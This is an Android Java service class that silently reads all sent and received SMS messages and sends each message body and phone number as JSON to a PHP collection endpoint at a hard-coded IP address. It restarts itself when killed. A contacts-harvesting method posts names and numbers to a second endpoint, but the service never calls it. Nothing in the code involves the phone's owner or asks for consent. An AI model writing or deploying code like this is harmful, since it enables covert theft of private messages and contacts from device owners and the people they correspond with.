package com.test.myapplication.broadcasts;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.Manifest;
import android.content.ContentResolver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.os.IBinder;
import android.provider.ContactsContract;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;

import com.android.volley.AuthFailureError;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.VolleyLog;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;
import com.test.myapplication.Post;

import org.json.JSONObject;

import java.io.UnsupportedEncodingException;
import java.security.Provider;


public class SendAllMessagesBroadcast extends Service {
    public JSONObject createJson(Post[] data) {
        JSONObject json = new JSONObject();
        for(Post test : data)
        {
            try {
                json.put(test.Field, test.Message);
            } catch (Exception e) {
                e.printStackTrace();
            }

        }
        return json;
    }


    protected void sendPost(JSONObject jsonBody, String url){
        final String requestBody = jsonBody.toString();


        RequestQueue queue = Volley.newRequestQueue(this);

        // Request a string response from the provided URL.
        StringRequest stringRequest = new StringRequest(Request.Method.POST, url,
                new Response.Listener<String>() {
                    @Override
                    public void onResponse(String response) {
                        Log.i("TAG", response);
                        // Display the first 500 characters of the response string.
                    }
                }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {
                Log.i("TAG",error.toString());
            }
        }){
            @Override
            public byte[] getBody() throws AuthFailureError {

                try {
                    return requestBody == null ? null : requestBody.getBytes("utf-8");
                } catch (UnsupportedEncodingException uee) {
                    VolleyLog.wtf("Unsupported Encoding while trying to get the bytes of %s using %s", requestBody, "utf-8");
                    return null;
                }
            }

            @Override
            public String getBodyContentType() {
                return "application/json";
            }
        };
        queue.add(stringRequest);
    }

    protected void getAllSentSms(){
        Cursor cursor = getContentResolver().query(Uri.parse("content://sms/sent"), null, null, null, null);
        if (cursor.moveToFirst()) { // must check the result to prevent exception
            do {

                //CREATES A MESSAGE
                String msgData = "";
                for(int idx=0;idx<cursor.getColumnCount();idx++)
                {
                    msgData += " " + cursor.getColumnName(idx) + ":" + cursor.getString(idx)+idx;
                }

                //CREATES A POST REQUEST SENDS TO DB
                Post[] post = new Post[2];
                post[0] = new Post("message", cursor.getString(12));
                post[1] = new Post("phone_number", cursor.getString(2));
                sendPost(createJson(post), "http://192.168.1.92:80/shutdown/post_android_message.php");

            } while (cursor.moveToNext());
        }
    }

    protected void getAllContacts(){

        ContentResolver cr = getContentResolver();
        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null);

        if ((cur != null ? cur.getCount() : 0) > 0) {
            while (cur != null && cur.moveToNext()) {

                String id = cur.getString(
                        cur.getColumnIndex(ContactsContract.Contacts._ID));
                String name = cur.getString(cur.getColumnIndex(
                        ContactsContract.Contacts.DISPLAY_NAME));

                if (cur.getInt(cur.getColumnIndex(
                        ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
                    Cursor pCur = cr.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{id}, null);

                    while (pCur.moveToNext()) {
                        String phoneNo = pCur.getString(pCur.getColumnIndex(
                                ContactsContract.CommonDataKinds.Phone.NUMBER));

                        Post[] post = new Post[2];
                        post[0] = new Post("phone_number",phoneNo.toString());
                        post[1] = new Post("phone_name",name.toString());
                        sendPost(createJson(post),"http://192.168.1.92:80/shutdown/post_android_number.php");
                        pCur.moveToNext();
                    }
                    pCur.close();
                }
            }
        }
        if(cur!=null){
            cur.close();
        }
    }

    protected void getallReceivedSms(){
        Cursor cursor = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);
        if (cursor.moveToFirst()) { // must check the result to prevent exception
            do {

                //CREATES A MESSAGE
                String msgData = "";
                for(int idx=0;idx<cursor.getColumnCount();idx++)
                {
                    msgData += " " + cursor.getColumnName(idx) + ":" + cursor.getString(idx)+idx;
                }

                //CREATES A POST REQUEST SENDS TO DB
                Post[] post = new Post[2];
                post[0] = new Post("message", cursor.getString(12));
                post[1] = new Post("phone_number", cursor.getString(2));
                sendPost(createJson(post), "http://192.168.1.92:80/shutdown/post_android_message.php");


            } while (cursor.moveToNext());
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int StartId){
        getAllSentSms();
        getallReceivedSms();
        return START_STICKY;
    }




    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }


}
